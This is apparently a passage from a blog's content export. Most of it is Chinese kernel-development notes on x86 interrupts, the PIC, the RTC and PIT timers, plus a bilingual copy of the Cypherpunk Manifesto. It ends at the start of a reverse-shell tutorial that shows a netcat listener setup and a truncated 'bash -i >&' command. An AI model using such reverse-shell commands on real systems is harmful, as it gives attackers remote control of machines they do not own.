&quot;#XF SIMD Floating-Point Exception\\0&quot;, &quot;#VE Virtualization Exception\\0&quot;, &quot;#CP Control Protection Exception\\0&quot;,&#125;;// 通知中断控制器，中断处理结束void send_eoi(int vector)&#123; if (vector &gt;= 0x20 &amp;&amp; vector &lt; 0x28) &#123; outb(PIC_M_CTRL, PIC_EOI); &#125; if (vector &gt;= 0x28 &amp;&amp; vector &lt; 0x30) &#123; outb(PIC_M_CTRL, PIC_EOI); outb(PIC_S_CTRL, PIC_EOI); &#125;&#125;u32 counter = 0;void default_handler(int vector)&#123; send_eoi(vector); LOGK(&quot;[%d] default interrupt called %d...\\n&quot;, vector, counter++);&#125;void exception_handler(int vector)&#123; char *message = NULL; if (vector &lt; 22) &#123; message = messages[vector]; &#125; else &#123; message = messages[15]; &#125; printk(&quot;Exception : [0x%02X] %s \\n&quot;, vector, messages[vector]); // 阻塞 hang();&#125;// 初始化中断控制器void pic_init()&#123; outb(PIC_M_CTRL, 0b00010001); // ICW1: 边沿触发, 级联 8259, 需要ICW4. outb(PIC_M_DATA, 0x20); // ICW2: 起始端口号 0x20 outb(PIC_M_DATA, 0b00000100); // ICW3: IR2接从片. outb(PIC_M_DATA, 0b00000001); // ICW4: 8086模式, 正常EOI outb(PIC_S_CTRL, 0b00010001); // ICW1: 边沿触发, 级联 8259, 需要ICW4. outb(PIC_S_DATA, 0x28); // ICW2: 起始端口号 0x28 outb(PIC_S_DATA, 2); // ICW3: 设置从片连接到主片的 IR2 引脚 outb(PIC_S_DATA, 0b00000001); // ICW4: 8086模式, 正常EOI outb(PIC_M_DATA, 0b11111110); // 关闭所有中断 outb(PIC_S_DATA, 0b11111111); // 关闭所有中断&#125;// 初始化中断描述符，和中断处理函数数组void idt_init()&#123; for (size_t i = 0; i &lt; ENTRY_SIZE; i++) &#123; gate_t *gate = &amp;idt[i]; handler_t handler = handler_entry_table[i]; gate-&gt;offset0 = (u32)handler &amp; 0xffff; gate-&gt;offset1 = ((u32)handler &gt;&gt; 16) &amp; 0xffff; gate-&gt;selector = 1 &lt;&lt; 3; // 代码段 gate-&gt;reserved = 0; // 保留不用 gate-&gt;type = 0b1110; // 中断门 gate-&gt;segment = 0; // 系统段 gate-&gt;DPL = 0; // 内核态 gate-&gt;present = 1; // 有效 &#125; for (size_t i = 0; i &lt; 0x20; i++) &#123; handler_table[i] = exception_handler; &#125; for (size_t i = 20; i &lt; ENTRY_SIZE; i++) &#123; handler_table[i] = default_handler; &#125; idt_ptr.base = (u32)idt; idt_ptr.limit = sizeof(idt) - 1; asm volatile(&quot;lidt idt_ptr\\n&quot;);&#125;void interrupt_init()&#123; pic_init(); idt_init();&#125; src/kernel/main.c 1234567891011121314151617181920void kernel_init()&#123; console_init(); gdt_init(); interrupt_init(); // task_init(); asm volatile( &quot;sti\\n&quot; &quot;movl %eax, %eax\\n&quot;); u32 counter = 0; while (true) &#123; DEBUGK(&quot;looping in kernel init %d...\\n&quot;, counter++); delay(1000000000); &#125; return;&#125; 具体步骤 在handler.asm下断点 会发现调用中断的时间都用不同，从asm volatile(&quot;sti\\n&quot;);之后，中断初始化完毕，开中断，标志寄存器IF位置1。则会调用中断处理函数 是因为CPU一直在监测中断，而不知道两个中断之间相隔多久，所以会这样乱序 参考 https://datasheetspdf.com/datasheet/80486.html https://www.bilibili.com/video/BV14e411s7CN 操作系统实现-任务中断与上下文 结合前面的知识，我们能否让中断帮助我们进行任务的切换 src/kernel/task.c 1234567891011121314151617u32 _ofp thread_a()//标及省略栈帧&#123; asm volatile(&quot;sti\\n&quot;);//开中断 while (true) &#123; printk(&quot;A&quot;); &#125;&#125;u32 _ofp thread_b()&#123; asm volatile(&quot;sti\\n&quot;);//开中断 while (true) &#123; printk(&quot;B&quot;); &#125;&#125; 由于我们通过中断进行任务的切换，所以要修改默认中断入口函数，由于要保存上下文，所以exception_handler报错是要打印相关寄存器的值；而且为了实现效果要打开中断 src/kernel/interrupt.c 12345678910111213141516171819202122232425262728293031323334353637383940void default_handler(int vector)&#123; send_eoi(vector); schedule();&#125;void exception_handler( int vector, u32 edi, u32 esi, u32 ebp, u32 esp, u32 ebx, u32 edx, u32 ecx, u32 eax, u32 gs, u32 fs, u32 es, u32 ds, u32 vector0, u32 error, u32 eip, u32 cs, u32 eflags)&#123; char *message = NULL; if (vector &lt; 22) &#123; message = messages[vector]; &#125; else &#123; message = messages[15]; &#125; printk(&quot;\\nEXCEPTION : %s \\n&quot;, messages[vector]); printk(&quot; VECTOR : 0x%02X\\n&quot;, vector); printk(&quot; ERROR : 0x%08X\\n&quot;, error); printk(&quot; EFLAGS : 0x%08X\\n&quot;, eflags); printk(&quot; CS : 0x%02X\\n&quot;, cs); printk(&quot; EIP : 0x%08X\\n&quot;, eip); printk(&quot; ESP : 0x%08X\\n&quot;, esp); // 阻塞 hang();&#125;void pic_init()&#123; ...... outb(PIC_M_DATA, 0b11111110); // 关闭所有中断 ......&#125; 同时为了保存上下文，要在中断处理时保存栈地相关信息并设置跳转 src/kernel/handler.asm 12345678910111213141516171819202122232425262728interrupt_entry: ;保存上下文 push ds push es push fs push gs pusha ;找到压入的中断向量（因为保存了上下文） mov eax, [esp + 12*4] ;中断向量处理函数传递参数 push eax ; 调用中断处理函数，handler_table 中存储了中断处理函数的指针 call [handler_table + eax * 4] ; 对应 push %1，调用结束恢复栈 add esp, 4 ;回复上下文 popa pop gs pop fs pop es pop ds add esp ,8 iret 自然的main.c要初始化任务才行 src/kernel/main.c 12345678910111213141516extern void console_init();extern void gdt_init();extern void interrupt_init();extern void clock_init();extern void hang();void kernel_init()&#123; console_init(); gdt_init(); interrupt_init(); task_init(); asm volatile(&quot;sti&quot;); hang();&#125; 操作系统实现-时钟 中断小结 #操作系统实现-中断与系统调用 #操作系统实现-异常 #操作系统实现-外中断 之前已经有了3篇相关的文章，这里做一个较为具体的总结 中断存在的意义 外部信息传递到CPU进行处理 跟更好的利用CPU：A任务等待输入输出时，中断后去处理B任务 计算机发生了某些异常，需要处理器立即执行一些操作：除0异常 外中断 在8086时代，中断是通过两个信号线引入处理器的： NMI(None Maskable Interrupt，非屏蔽中断) Intel规定：只有存在超过4个时钟周期的NMI才能被处理器识别 RAM：内存校验错 IOCHK：I/O校验错 INTR(Interrupt，可屏蔽中断) 个人计算机中最常用的是中断代理：8259芯片 Intel允许使用256个中断，由图可知8256维持15个中断，并且8256中中断信号不固定，因此称为可编程中断控制器（Programmable Inpterrupt Controller，PIC） 又由图可知，要实现全部功能，需要两块8256进行芯片级联。 使用时钟功能：主片IRQ2 使用实时时钟：主片连接int(IRQ2)-&gt;从片IRQ8-&gt;主片IR2 时钟、CMOS、BCD编码 RTC 从简单的思路来说，你只需要一个实时时钟电路(Real Time Clock，RTC)和一个CMOS小块组成的静态存储器就可以实现时钟的功能。 一般的RTC是由振荡频率为32.768kHz的石英晶体振荡器驱动，分频过后进行每秒一次的刷新 CMOS 同样为了能让外部访问，该硬件有两个端口： CMOS 地址寄存器：0x70 CMOS 数据寄存器：0x71 同时有时间信息（） 偏移值 意义 0x1 CMOS_SECOND 0x3 CMOS_MINUTE 0x5 CMOS_HOUR 0xa CMOS_Areg 0xb CMOS_Breg 0xc CMOS_Creg 0xd CMOS_Dreg 0x80 CMOS_NMI BCD BCD(Binary Coded Decimal)是CMOS RAM中保存时间信息的格式 动态时钟的实现 除非是计算机考古学家，否则直接上手很难，所以直接参(开)考(抄)Linux /include/linux/time.h 1234567891011121314151617181920212223242526272829303132333435#ifndef _LINUX_TIME_H#define _LINUX_TIME_Hstruct timeval &#123; long tv_sec; /* seconds */ long tv_usec; /* microseconds */&#125;;struct timezone &#123; int tz_minuteswest; /* minutes west of Greenwich */ int tz_dsttime; /* type of dst correction */&#125;;#define NFDBITS __NFDBITS#define FD_SETSIZE __FD_SETSIZE#define FD_SET(fd,fdsetp) __FD_SET(fd,fdsetp)#define FD_CLR(fd,fdsetp) __FD_CLR(fd,fdsetp)#define FD_ISSET(fd,fdsetp) __FD_ISSET(fd,fdsetp)#define FD_ZERO(fdsetp) __FD_ZERO(fdsetp)/* * Names of the interval timers, and structure * defining a timer setting. */#define ITIMER_REAL 0#define ITIMER_VIRTUAL 1#define ITIMER_PROF 2struct itimerval &#123; struct timeval it_interval; /* timer interval */ struct timeval it_value; /* current value */&#125;;#endif 这个是Linux比较老的版本之一的，有点过时了，但是我们可以修改为 src/include/xsys/time.h 123456789101112131415161718192021222324#ifndef XSYS_TIME_H#define XSYS_TIME_H#include &lt;xsys/types.h&gt;typedef struct tm&#123; int tm_sec; int tm_min; int tm_hour; int tm_mday; int tm_mon; int tm_year; int tm_wday; int tm_yday; int tm_isdst;//夏令时标志&#125;tm;void time_read_bcd(tm *time);void time_read(tm *time);time_t mktime(tm *time);#endif 接着便是：初始化时间 src/kernel/time.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153#include &lt;xsys/time.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/stdlib.h&gt;#include &lt;xsys/rtc.h&gt;#define LOGK(fmt, args...) DEBUGK(fmt, ##args)#define CMOS_ADDR 0x70 // CMOS 地址寄存器#define CMOS_DATA 0x71 // CMOS 数据寄存器// 下面是 CMOS 信息的寄存器索引#define CMOS_SECOND 0x00 // (0 ~ 59)#define CMOS_MINUTE 0x02 // (0 ~ 59)#define CMOS_HOUR 0x04 // (0 ~ 23)#define CMOS_WEEKDAY 0x06 // (1 ~ 7) 星期天 = 1，星期六 = 7#define CMOS_DAY 0x07 // (1 ~ 31)#define CMOS_MONTH 0x08 // (1 ~ 12)#define CMOS_YEAR 0x09 // (0 ~ 99)#define CMOS_CENTURY 0x32 // 可能不存在#define CMOS_NMI 0x80#define MINUTE 60 // 每分钟的秒数#define HOUR (60 * MINUTE) // 每小时的秒数#define DAY (24 * HOUR) // 每天的秒数#define YEAR (365 * DAY) // 每年的秒数，以 365 天算// 每个月开始时的已经过去天数static int month[13] = &#123; 0, // 这里占位，没有 0 月，从 1 月开始 0, (31), (31 + 29), (31 + 29 + 31), (31 + 29 + 31 + 30), (31 + 29 + 31 + 30 + 31), (31 + 29 + 31 + 30 + 31 + 30), (31 + 29 + 31 + 30 + 31 + 30 + 31), (31 + 29 + 31 + 30 + 31 + 30 + 31 + 31), (31 + 29 + 31 + 30 + 31 + 30 + 31 + 31 + 30), (31 + 29 + 31 + 30 + 31 + 30 + 31 + 31 + 30 + 31), (31 + 29 + 31 + 30 + 31 + 30 + 31 + 31 + 30 + 31 + 30)&#125;;time_t startup_time;int century;// 这里生成的时间可能和 UTC 时间有出入// 与系统具体时区相关，不过也不要紧，顶多差几个小时time_t mktime(tm *time)&#123; time_t res; int year; // 1970 年开始的年数 // 下面从 1900 年开始的年数计算 if (time-&gt;tm_year &gt;= 70) year = time-&gt;tm_year - 70; else year = time-&gt;tm_year - 70 + 100; // 这些年经过的秒数时间 res = YEAR * year; // 已经过去的闰年，每个加 1 天 res += DAY * ((year + 1) / 4); // 已经过完的月份的时间 res += month[time-&gt;tm_mon] * DAY; // 如果 2 月已经过了，并且当前不是闰年，那么减去一天 if (time-&gt;tm_mon &gt; 2 &amp;&amp; ((year + 2) % 4)) res -= DAY; // 这个月已经过去的天 res += DAY * (time-&gt;tm_mday - 1); // 今天过去的小时 res += HOUR * time-&gt;tm_hour; // 这个小时过去的分钟 res += MINUTE * time-&gt;tm_min; // 这个分钟过去的秒 res += time-&gt;tm_sec; return res;&#125;int get_yday(tm *time)&#123; int res = month[time-&gt;tm_mon]; // 已经过去的月的天数 res += time-&gt;tm_mday; // 这个月过去的天数 int year; if (time-&gt;tm_year &gt;= 70) year = time-&gt;tm_year - 70; else year = time-&gt;tm_year - 70 + 100; // 如果不是闰年，并且 2 月已经过去了，则减去一天 // 注：1972 年是闰年，这样算不太精确，忽略了 100 年的平年 if ((year + 2) % 4 &amp;&amp; time-&gt;tm_mon &gt; 2) &#123; res -= 1; &#125; return res;&#125;void time_read_bcd(tm *time)&#123; // CMOS 的访问速度很慢。为了减小时间误差，在读取了下面循环中所有数值后， // 若此时 CMOS 中秒值发生了变化，那么就重新读取所有值。 // 这样内核就能把与 CMOS 的时间误差控制在 1 秒之内。 do &#123; time-&gt;tm_sec = cmos_read(CMOS_SECOND); time-&gt;tm_min = cmos_read(CMOS_MINUTE); time-&gt;tm_hour = cmos_read(CMOS_HOUR); time-&gt;tm_wday = cmos_read(CMOS_WEEKDAY); time-&gt;tm_mday = cmos_read(CMOS_DAY); time-&gt;tm_mon = cmos_read(CMOS_MONTH); time-&gt;tm_year = cmos_read(CMOS_YEAR); century = cmos_read(CMOS_CENTURY); &#125; while (time-&gt;tm_sec != cmos_read(CMOS_SECOND));&#125;void time_read(tm *time)&#123; time_read_bcd(time); time-&gt;tm_sec = bcd_to_bin(time-&gt;tm_sec); time-&gt;tm_min = bcd_to_bin(time-&gt;tm_min); time-&gt;tm_hour = bcd_to_bin(time-&gt;tm_hour); time-&gt;tm_wday = bcd_to_bin(time-&gt;tm_wday); time-&gt;tm_mday = bcd_to_bin(time-&gt;tm_mday); time-&gt;tm_mon = bcd_to_bin(time-&gt;tm_mon); time-&gt;tm_year = bcd_to_bin(time-&gt;tm_year); time-&gt;tm_yday = get_yday(time); time-&gt;tm_isdst = -1; century = bcd_to_bin(century);&#125;void time_init()&#123; tm time; time_read(&amp;time); startup_time = mktime(&amp;time); LOGK(&quot;startup time: %d%d-%02d-%02d %02d:%02d:%02d\\n&quot;, century, time.tm_year, time.tm_mon, time.tm_mday, time.tm_hour, time.tm_min, time.tm_sec);&#125; 12345678u8 bcd_to_bin(u8 value)&#123; return (value &amp; 0xf) + (value &gt;&gt; 4) *10;&#125;u8 bin_to_bcd(u8 value)&#123; return (value / 10)*0x10 + (value % 10);&#125; 基本上就是调用上述接口就可以实现 1234567891011121314151617extern void console_init();extern void gdt_init();extern void interrupt_init();extern void clock_init();extern void time_init();extern void rtc_init();extern void hang();void kernel_init()&#123; console_init(); gdt_init(); interrupt_init(); time_init(); asm volatile(&quot;sti&quot;); hang();&#125; makefile的qemu选项里面加上-rtc base=localtime，就可以得到当前时区时间，就不需要我们手动计算了 动态时钟就需要对RTC进行更多操作 而且我们对RTC的基本操作很少 src/include/xsys/rtc.h 12345678#ifndef XSYS_RTC_H#define XSYS_RTC_Hvoid set_alarm(u32 secs);u8 cmos_read(u8 addr);void cmos_write(u8 addr, u8 value);#endif src/kernel/rtc.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#include &lt;xsys/types.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/interrupt.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/time.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/stdlib.h&gt;#define LOGK(fmt, args...) DEBUGK(fmt, ##args)#define CMOS_ADDR 0x70 // CMOS 地址寄存器#define CMOS_DATA 0x71 // CMOS 数据寄存器#define CMOS_SECOND 0x01#define CMOS_MINUTE 0x03#define CMOS_HOUR 0x05#define CMOS_A 0x0a#define CMOS_B 0x0b#define CMOS_C 0x0c#define CMOS_D 0x0d#define CMOS_NMI 0x80// 读 cmos 寄存器的值u8 cmos_read(u8 addr)&#123; outb(CMOS_ADDR, CMOS_NMI | addr); return inb(CMOS_DATA);&#125;;// 写 cmos 寄存器的值void cmos_write(u8 addr, u8 value)&#123; outb(CMOS_ADDR, CMOS_NMI | addr); outb(CMOS_DATA, value);&#125;static u32 volatile counter = 0;// 实时时钟中断处理函数void rtc_handler(int vector)&#123; // 实时时钟中断向量号 assert(vector == 0x28); // 向中断控制器发送中断处理完成的信号 send_eoi(vector); // 读 CMOS 寄存器 C，允许 CMOS 继续产生中断 cmos_read(CMOS_C); set_alarm(1); LOGK(&quot;rtc handler %d...\\n&quot;, counter++);&#125;// 设置 secs 秒后发生实时时钟中断void set_alarm(u32 secs)&#123; tm time; time_read(&amp;time); u8 sec = secs % 60; secs /= 60; u8 min = secs % 60; secs /= 60; u32 hour = secs; time.tm_sec += sec; if (time.tm_sec &gt;= 60) &#123; time.tm_sec %= 60; time.tm_min += 1; &#125; time.tm_min += min; if (time.tm_min &gt;= 60) &#123; time.tm_min %= 60; time.tm_hour += 1; &#125; time.tm_hour += hour; if (time.tm_hour &gt;= 24) &#123; time.tm_hour %= 24; &#125; cmos_write(CMOS_HOUR, bin_to_bcd(time.tm_hour)); cmos_write(CMOS_MINUTE, bin_to_bcd(time.tm_min)); cmos_write(CMOS_SECOND, bin_to_bcd(time.tm_sec));&#125;void rtc_init()&#123; u8 prev; cmos_write(CMOS_B, 0b01000010); // 打开周期中断 // cmos_write(CMOS_B, 0b00100010); // 打开闹钟中断 cmos_read(CMOS_C); // 读 C 寄存器，以允许 CMOS 中断 // set_alarm(2); // 设置中断频率 outb(CMOS_A, (inb(CMOS_A) &amp; 0xf) | 0b1110); set_interrupt_handler(IRQ_RTC, rtc_handler); set_interrupt_mask(IRQ_RTC, true); set_interrupt_mask(IRQ_CASCADE, true);&#125; 着重说一下rtc_init 123456789101112131415void rtc_init()&#123; u8 prev; cmos_write(CMOS_B, 0b01000010); // 打开周期中断 // cmos_write(CMOS_B, 0b00100010); // 打开闹钟中断 cmos_read(CMOS_C); // 读 C 寄存器，以允许 CMOS 中断 // set_alarm(2); // 设置中断频率 outb(CMOS_A, (inb(CMOS_A) &amp; 0xf) | 0b1110); set_interrupt_handler(IRQ_RTC, rtc_handler); set_interrupt_mask(IRQ_RTC, true); set_interrupt_mask(IRQ_CASCADE, true);&#125; cmos_write(CMOS_B, 0b01000010); // 打开周期中断是单纯的基本中断，即CMOS按照其固定的时间刷新 cmos_write(CMOS_B, 0b00100010);我们就可以设置每次中断发生的时间，比如上面注释掉的set_alarm(2);就是中断每2s发生一次 两个数值(功能)的选择可以从8256芯片的级联图中看出 时钟中断 常用的可编程定时计数器 (Programmable Interval Timer PIT) 有 Intel 8253/8254，其中 8254 可以称为 8253 的增强版。 在 8253 内部有 3 个独立的计数器，分别是计数器 0 ~ 2，端口号分别为 0x40 ~ 0x42；每个计数器完全相同，都是 16 位大小，相互独立，互不干涉。 8253 计数器是个减法计数器，从初值寄存器中得到初值，然后载入计数器中，然后随着时钟变化递减。计数器初值寄存器，计数器执行寄存器，和输出锁存器都是 16 位的寄存器，高八位和低八位可以单独访问。 计数器 0 用于产生时钟中断，就是连接在 IRQ0 引脚上的时钟，也就是控制计数器 0 可以控制时钟发生的频率，以改变时间片的间隔； 控制字结构： 7 6 5 4 3 2 1 0 SC1 SC0 RL1 RL0 M2 M1 M0 BCD 三个计数器有自己各自的用途： 计数器 0，端口号 0x40，用于产生时钟信号，它采用工作方式 3； 计数器 1，端口号 0x41，用于 DRAM 的定时刷新控制； 计数器 2，端口号 0x42，用于内部扬声器发出不同音调的声音，原理是给扬声器输送某频率的方波； src/kernel/clock.c 1234567891011121314151617181920212223242526272829303132#include &lt;xsys/io.h&gt;#include &lt;xsys/interrupt.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;#define PIT_CHAN0_REG 0X40#define PIT_CHAN2_REG 0X42#define PIT_CTRL_REG 0X43void clock_handler(int vector)&#123; assert(vector == 0x20); send_eoi(vector); jiffies++; DEBUGK(&quot;clock jiffies %d ...\\n&quot;, jiffies);&#125;void pit_init()&#123; // 配置计数器 0 时钟 outb(PIT_CTRL_REG, 0b00110100); outb(PIT_CHAN0_REG, CLOCK_COUNTER &amp; 0xff); outb(PIT_CHAN0_REG, (CLOCK_COUNTER &gt;&gt; 8) &amp; 0xff);&#125;void clock_init()&#123; pit_init(); set_interrupt_handler(IRQ_CLOCK, clock_handler); set_interrupt_mask(IRQ_CLOCK, true);&#125; 但是这个例子没什么实际的东西，我们看到的也只有上面不断显示的字符，下面就有了更好的体验 蜂鸣器 由PIT我们可以设置方波来发出声音，要添加一些东西 12345678910111213141516171819202122232425262728293031#define HZ 100#define OSCILLATOR 1193182#define CLOCK_COUNTER (OSCILLATOR / HZ)#define JIFFY (1000 / HZ)#define SPEAKER_REG 0x61#define BEEP_HZ 440#define BEEP_COUNTER (OSCILLATOR / BEEP_HZ)u32 volatile jiffies = 0;u32 jiffy = JIFFY;u32 volatile beeping = 0;void start_beep()&#123; if (!beeping) &#123; outb(SPEAKER_REG, inb(SPEAKER_REG) | 0b11); &#125; beeping = jiffies + 5;&#125;void stop_beep()&#123; if (beeping &amp;&amp; jiffies &gt; beeping) &#123; outb(SPEAKER_REG, inb(SPEAKER_REG) &amp; 0xfc); beeping = 0; &#125;&#125; 同时修改clock_handler 1234567891011121314void clock_handler(int vector)&#123; assert(vector == 0x20); send_eoi(vector); if(jiffies % 200 == 0) &#123; start_beep(); &#125; jiffies++; DEBUGK(&quot;clock beep %d ...\\n&quot;, jiffies); stop_beep();&#125; 在qemu上发声我的不知道是什么原因不行，但是导出在VMware上就可以了 软中断 这个里面就包括了最开始说的除0异常。软中断是发生在计算机内部的中断信号，是由执行指令引起的 操作系统实现-中断与系统调用和操作系统实现-异常主要讲的就是这种中断 CPU时钟周期和前面实时时钟的不一样，CPU内部是有一个时钟周期作为指令操作的最小步骤的，当CPU运算快时，时钟周期就短（其倒数频率就越大），如Intel(R) Core(TM) i5-9300H CPU的基础时钟频率就是2.6GHz，每个时钟周期的时间就是1/(2.6*1024*1024*1024)秒。 引用 x86汇编语言：从实模式到保护模式 / 李忠，王晓波，余洁著 中断处理 - 上半部（硬中断） 操作系统实现-内存管理初步 复习 计算机启动过程 386/486 内存分页中以 4KB 为一页 奔腾处理器使用4M为一页","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"os","slug":"notes/os","permalink":"https://joe1sn.eu.org/categories/notes/os/"}],"tags":[{"name":"os","slug":"os","permalink":"https://joe1sn.eu.org/tags/os/"}]},{"title":"密码朋克：一份密码朋克宣言","slug":"cypherpunk","date":"2022-08-14T07:25:53.000Z","updated":"2023-06-01T14:26:03.768Z","comments":true,"path":"2022/08/14/cypherpunk/","link":"","permalink":"https://joe1sn.eu.org/2022/08/14/cypherpunk/","excerpt":"为何自由与隐私如此重要","text":"为何自由与隐私如此重要 译文 一份密码朋克宣言 Eric Hughes著 Joe1sn渣译 隐私在电子时代对于一个开放的社会是必要的。隐私不是保密。隐私是一个人不想让全世界知道，但是保密是一个人不想让全任何人知道。隐私是一个人对这个世界选择性表达自我的权力。 如果双方有某种交易，那么每一方都有他们互动的记忆。 每一方都可以谈论他们自己对此的记忆； 谁能阻止这发生？人们可以通过法律反对它，但是对于言论自由甚至比隐私更加重要，这是开放社会的基础。如果多方在同一个论坛上共同发言，则每一方都可以与其他所有方共同对话，并将个体的和其他只是汇总在一起。电子通信的力量已经使这种讲话称为可能，它不会仅仅因为我们可能想要它而消失。 既然我们渴望隐私，我们必须确保交易的每方只有直接与该交易相关的必要的信息。鉴于所有信息都能被表达出，我们必须确保尽可能少地透露无关信息。对于大多数例子中的个人标识(ID)的需要并不是十分突出。当我们在商店中购买一本杂志并付款给店员时，并没有必要知道我是谁。当我让我的电子邮箱提供方收发邮件时，我的提供方不需要知道谁与我对话或者我和其他人说了些什么。我的提供方只需要知道如何在那里获取信息以及我欠他们多少费用。当我的身份在交易的底层机制中被揭露了，我就失去了隐私。我不能在这里选择性地展示自己； 我必须 经常 暴露自己。 因此，为了开放社会中的隐私就需要一种匿名交易系统。直到现在，现金是第一个满足这个条件的系统。一个匿名的交易系统不是一个保密的交易系统。一个匿名的交易系统的个体具有想揭露自身身份就揭露的权力；这也是隐私的本质。 在开放社会中的隐私也需要密码学。如果我说了些什么，我只想让我想知道的人知道。如果我的私密讲话被全世界知道，我就失去了隐私。对信息的加密表明了对隐私的追求，使用弱加密算法加密表达的是对与隐私不是特别的追求。此外，为了在默认匿名的情况下显示一个人的身份，需要密码学签名。 我们不能指望政府，企业，其他巨头、不露面的组织出于他们的善意保证我们的隐私。谈论我们对他们是有利的，并且我们认为他们会谈论我们。去尝试保护他们的演讲就是反击信息的真实。信息不是想要自由，而是注定自由。信息扩大到每一个可用的存储空间。信息是谣言更年轻，更强壮的的表亲；信息比谣言更快，有更多的眼睛，知道的更多，了解的更少。 我们必须保护我们的隐私如果我们期望的话。我们必须在一起共同创造允许匿名交易发生的系统。人们在几个世纪内通过耳语，黑暗，信封，紧闭的门，秘密握手和邮递保护他们的隐私。旧时代的科技并不允许有很私密的隐私，但是电子科技可以。 我们密码朋克投入到建设匿名系统。我们使用密码学、匿名邮件、数字签名和电子货币来保卫我们的隐私。 密码朋克编写代码。我们知道有人必须编写软件来保护隐私，并且除非我们都这样做，否则我们无法获得隐私，因此我们将编写它。我们发布我们的代码所以其他的密码朋克可以练习和玩耍这些代码。我们的代码是全世界性的免费使用的。我们并不关心如果你不赞同我们编写的软件。我们知道软件是不可能被毁灭的并且一个大范围部署的系统是不能被关停的。 密码朋克对密码学的规定感到痛惜，因为加密本质上是一种私人行为。事实上，对于加密这种行为，让信息从公众领域中被移除。即使是反对密码学的法律也只能触及一个国家的边界和它的暴力武器。密码朋克会不可避免地在全球发展，伴随着的是匿名交易系统使这成为可能。 为了隐私权的广泛传播它必须成为社会共识的一部分。人们必须为了共同利益来部署这些系统。隐私只能延伸到社会同胞的合作范围内。我们密码朋克寻求您的问题和疑虑，并希望我们可以与您互动，以免我们自欺欺人。然而，我们不会因为有些人可能不同意我们的目标而离开我们的目标。 密码朋克积极致力于使网络更安全以保护隐私。 让我们一起快速前进。 向前。 Eric Hughes 1993年3月9日 原文 A Cypherpunk’s Manifesto by Eric Hughes Privacy is necessary for an open society in the electronic age. Privacy is not secrecy. A private matter is something one doesn’t want the whole world to know, but a secret matter is something one doesn’t want anybody to know. Privacy is the power to selectively reveal oneself to the world. If two parties have some sort of dealings, then each has a memory of their interaction. Each party can speak about their own memory of this; how could anyone prevent it? One could pass laws against it, but the freedom of speech, even more than privacy, is fundamental to an open society; we seek not to restrict any speech at all. If many parties speak together in the same forum, each can speak to all the others and aggregate together knowledge about individuals and other parties. The power of electronic communications has enabled such group speech, and it will not go away merely because we might want it to. Since we desire privacy, we must ensure that each party to a transaction have knowledge only of that which is directly necessary for that transaction. Since any information can be spoken of, we must ensure that we reveal as little as possible. In most cases personal identity is not salient. When I purchase a magazine at a store and hand cash to the clerk, there is no need to know who I am. When I ask my electronic mail provider to send and receive messages, my provider need not know to whom I am speaking or what I am saying or what others are saying to me; my provider only need know how to get the message there and how much I owe them in fees. When my identity is revealed by the underlying mechanism of the transaction, I have no privacy. I cannot here selectively reveal myself; I must always reveal myself. Therefore, privacy in an open society requires anonymous transaction systems. Until now, cash has been the primary such system. An anonymous transaction system is not a secret transaction system. An anonymous system empowers individuals to reveal their identity when desired and only when desired; this is the essence of privacy. Privacy in an open society also requires cryptography. If I say something, I want it heard only by those for whom I intend it. If the content of my speech is available to the world, I have no privacy. To encrypt is to indicate the desire for privacy, and to encrypt with weak cryptography is to indicate not too much desire for privacy. Furthermore, to reveal one’s identity with assurance when the default is anonymity requires the cryptographic signature. We cannot expect governments, corporations, or other large, faceless organizations to grant us privacy out of their beneficence. It is to their advantage to speak of us, and we should expect that they will speak. To try to prevent their speech is to fight against the realities of information. Information does not just want to be free, it longs to be free. Information expands to fill the available storage space. Information is Rumor’s younger, stronger cousin; Information is fleeter of foot, has more eyes, knows more, and understands less than Rumor. We must defend our own privacy if we expect to have any. We must come together and create systems which allow anonymous transactions to take place. People have been defending their own privacy for centuries with whispers, darkness, envelopes, closed doors, secret handshakes, and couriers. The technologies of the past did not allow for strong privacy, but electronic technologies do. We the Cypherpunks are dedicated to building anonymous systems. We are defending our privacy with cryptography, with anonymous mail forwarding systems, with digital signatures, and with electronic money. Cypherpunks write code. We know that someone has to write software to defend privacy, and since we can’t get privacy unless we all do, we’re going to write it. We publish our code so that our fellow Cypherpunks may practice and play with it. Our code is free for all to use, worldwide. We don’t much care if you don’t approve of the software we write. We know that software can’t be destroyed and that a widely dispersed system can’t be shut down. Cypherpunks deplore regulations on cryptography, for encryption is fundamentally a private act. The act of encryption, in fact, removes information from the public realm. Even laws against cryptography reach only so far as a nation’s border and the arm of its violence. Cryptography will ineluctably spread over the whole globe, and with it the anonymous transactions systems that it makes possible. For privacy to be widespread it must be part of a social contract. People must come and together deploy these systems for the common good. Privacy only extends so far as the cooperation of one’s fellows in society. We the Cypherpunks seek your questions and your concerns and hope we may engage you so that we do not deceive ourselves. We will not, however, be moved out of our course because some may disagree with our goals. The Cypherpunks are actively engaged in making the networks safer for privacy. Let us proceed together apace. Onward. Eric Hughes 9 March 1993","categories":[{"name":"misc","slug":"misc","permalink":"https://joe1sn.eu.org/categories/misc/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://joe1sn.eu.org/tags/misc/"},{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"}]},{"title":"常规反弹shell合集","slug":"reverse-shell","date":"2022-07-29T11:18:41.000Z","updated":"2023-06-01T14:26:19.370Z","comments":true,"path":"2022/07/29/reverse-shell/","link":"","permalink":"https://joe1sn.eu.org/2022/07/29/reverse-shell/","excerpt":"反弹shell的常见方式","text":"反弹shell的常见方式 反弹Shell-Linux 12345678【监听端】centos: 192.168.35.152【被控端】kali: 192.168.35.128 # 监听端执行[root@localhost ~]# nc -vvl 7777Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::7777Ncat: Listening on 0.0.0.0:7777 bash 123┌──(root@kali)-[/home/kali]└─# bash -i &gt;&amp; 